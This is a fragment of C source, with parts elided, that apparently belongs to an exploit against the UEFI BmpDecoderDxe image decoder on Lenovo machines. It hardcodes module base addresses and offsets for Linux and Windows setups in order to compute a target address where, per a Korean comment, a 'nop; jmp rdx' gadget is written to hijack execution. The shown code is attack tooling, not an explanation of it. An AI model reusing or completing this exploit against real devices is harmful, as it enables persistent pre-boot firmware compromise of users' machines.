...
int main(int argc, char* argv[]) {
    ...
    uint32_t TARGET_ADDRESS = BmpDecoderDxe_BASE + 0x824; //3바이트 nop; jmp rdx; 적힐 주소... 907F8.h 16번째 줄 참고

    bool IS_REAL_DEVICE = true;
    if (IS_REAL_DEVICE)
    {
        //lenovo linux
        BmpDecoderDxe_BASE = 0x3D9BF000;
        BmpDecoderDxe_BASE -= 0x36f41e10;
        
        //>>> hex(0x36f06910 - 0x907f8)
        //'0x36e76118'

        //>>> hex(0x36f06c10 - 0x907f8)
        //'0x36e76418'

        //>>> hex(0x3749c410 - 0x907f8)
        //'0x3740bc18'

        //lenovo_linux
        //>>> hex(0x36f41e10 - 0x907f8)
        //'0x36eb1618'

        //lenovo_ubuntu
        //>>> hex(0x3811ff90 - 0x907f8)
        //'0x3808f798'

        //lenovo win
        BmpDecoderDxe_BASE = 0x3FE64000;
        BmpDecoderDxe_BASE -= 0x38094f18;

        TARGET_ADDRESS = BmpDecoderDxe_BASE + 0x824;//BmpDecoderDxe_BASE + 0x824;
    }
